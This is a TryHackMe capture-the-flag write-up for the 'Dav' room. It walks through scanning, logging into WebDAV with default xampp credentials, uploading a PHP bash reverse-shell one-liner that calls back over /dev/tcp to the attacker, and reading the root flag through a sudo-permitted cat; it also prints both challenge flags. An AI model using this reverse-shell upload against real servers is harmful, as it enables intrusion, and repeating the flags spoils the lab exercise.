## Dav - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/bsidesgtdav)

**IP: 10.10.252.247**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, Gobuster

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20CUT.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan
  ```
  nmap -sC -sV -T5 -p- 10.10.252.247

  Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-03 14:59 BST
  Warning: 10.10.252.247 giving up on port because retransmission cap hit (2).
  Nmap scan report for 10.10.252.247
  Host is up (0.047s latency).
  Not shown: 65470 closed tcp ports (reset), 64 filtered tcp ports (no-response)
  PORT   STATE SERVICE VERSION
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 56.28 seconds
  ```
  
- Since it has web page, now I do Gobuster.
  ```
  gobuster dir -u http://10.10.252.247 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /webdav               (Status: 401) [Size: 460]
  /server-status        (Status: 403) [Size: 301]
  Progress: 220560 / 220561 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- Now, I visited `server-status` and it wasn't helpful, but `webdav` was. it has a login page which is exploitable and my only access to the target.
  
---

## ⚙️ Shell Access

- So I spent a pretty decent amount of time looking for different exploits. At the end I just googled `webdav default login credentials` and found [this page](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) that has default login credentials and command to upload files!
  ```
  wampp
  xampp

  cadaver http://<REMOTE HOST>/webdav/
  ```
  
- That actually worked! Since I'm in, I found `passwd.dav` that contains password for `wampp`. Now I started uploading shells, I was trying so hard to make this [Pentest Monkey shell](https://github.com/pentestmonkey/php-reverse-shell) work but I couldn't do it...
  
- Then I decided to change the shell and found this one liner which is DA GOAT!!! DA GOAT !!! 🐐
  ```
  nano phpreverse.php
  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/[YOUR-THM-IP]/[PORT] 0>&1'");
  ```

- Now upload the shell, start the listener and then visit the `webdav` and open the shell. Voila, you are in!
  ```
  cadaver http://10.10.252.247/webdav/ 

  Authentication required for webdav on server `10.10.252.247':
  Username: wampp
  Password: 
  dav:/webdav/> help
  Available commands: 
   ls         cd         pwd        put        get        mget       mput       
   edit       less       mkcol      cat        delete     rmcol      copy       
   move       rename     lock       unlock     discover   steal      showlocks  
   version    checkin    checkout   uncheckout history    label      propnames  
   chexec     propget    propdel    propset    search     set        open       
   close      echo       quit       unset      lcd        lls        lpwd       
   logout     help       describe   about      
  Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye

  dav:/webdav/> put phpreverse.php
  Uploading phpreverse.php to `/webdav/phpreverse.php':
  Progress: [=============================>] 100.0% of 74 bytes succeeded.
  dav:/webdav/> ls
  Listing collection `/webdav/': succeeded.
          2php-reverse-shell.php              5495  May  3 16:10
          passwd.dav                            44  Aug 26  2019
          php-reverse-shell.php               5495  May  3 16:08
          phpreverse.php                        74  May  3 16:16
          reverse-shell.php                   5492  May  3 16:05
  dav:/webdav/> 
  ```

  ```
  nc -lvnp 4444

  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.252.247] 36462
  bash: cannot set terminal process group (708): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@ubuntu:/var/www/html/webdav$
  ```

- Awesome! Now lets find those flags.

---

## 🧍 User Privilege Escalation

- You can get the user flag with two simple commands.
  ```
  www-data@ubuntu:/var/www/html/webdav$ find / -name user.txt 2>/dev/null
  find / -name user.txt 2>/dev/null
  /home/merlin/user.txt
  
  www-data@ubuntu:/var/www/html/webdav$ cat /home/merlin/user.txt
  cat /home/merlin/user.txt
  449b40fe93f78a938523b7e4dcd66d2a
  ```
  
- Now going for root flag.

---

## 👑 Root Privilege Escalation

- OK, I'm gonna say this right now, this was the easiest root flag ever made period. Just use `sudo -l` and you'll see...
  ```
  www-data@ubuntu:/var/www/html/webdav$ sudo -l
  sudo -l
  Matching Defaults entries for www-data on ubuntu:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User www-data may run the following commands on ubuntu:
      (ALL) NOPASSWD: /bin/cat
  
  www-data@ubuntu:/var/www/html/webdav$ sudo cat /root/root.txt
  sudo cat /root/root.txt
  101101ddc16b0cdf65ba0b8a7af7afa5
  ```
  
- TOLD YA, BYE! 💋

---

## 🏁 Flags

- **User Flag**: `449b40fe93f78a938523b7e4dcd66d2a`
- **Root Flag**: `101101ddc16b0cdf65ba0b8a7af7afa5`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Mastering googling...`

- What did I learn?
  `Never give up, never!`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
